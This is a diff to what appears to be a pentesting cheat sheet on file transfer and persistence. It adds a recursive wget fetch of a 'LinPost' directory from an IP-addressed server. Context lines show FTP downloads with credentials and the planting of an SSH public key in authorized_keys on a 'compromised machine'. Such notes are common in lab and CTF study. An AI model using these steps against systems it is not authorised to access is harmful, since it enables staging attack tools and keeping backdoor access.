@@ -16,6 +16,13 @@ You can download files using `wget` like this:
 wget 192.168.1.102:9999/file.txt
 ```
 
+download a directory recursively and eliminate obligatory index.html
+
+```
+
+wget -r -np -R "index.html*" http://10.10.10.78:7000/LinPost
+```
+
 ## Curl
 
 ```
@@ -80,7 +87,7 @@ If you have access to a ftp-client to can of course just use that. Remember, if 
 
 or
 
- If ftp anonymous login is provided or you have login details, you can download the contents by wget, \(For anonymous login user password are not required\)
+If ftp anonymous login is provided or you have login details, you can download the contents by wget, \(For anonymous login user password are not required\)
 
 ```
 wget -rq ftp://IP --ftp-user=username --ftp-password=password
@@ -119,14 +126,14 @@ ssh-keygen -t rsa -C "your_email@example.com"
 then you enter a name for the key.
 
 Enter file in which to save the key \(/root/.ssh/id\_rsa\): nameOfMyKey  
-Enter passphrase \(empty for no passphrase\):   
+Enter passphrase \(empty for no passphrase\):  
 Enter same passphrase again:
 
 This will create two files, one called `nameOfMyKey` and another called `nameOfMyKey_pub`. The one with the `_pub` is of course your public key. And the other key is your private.
 
 1. Add your public key to authorized\_keys.
 
-Now you copy the content of `nameOfMyKey_pub`.   
+Now you copy the content of `nameOfMyKey_pub`.  
 On the compromised machine you go to `~/.ssh` and then run add the public key to the file authorized\_keys. Like this
 
 ```bash
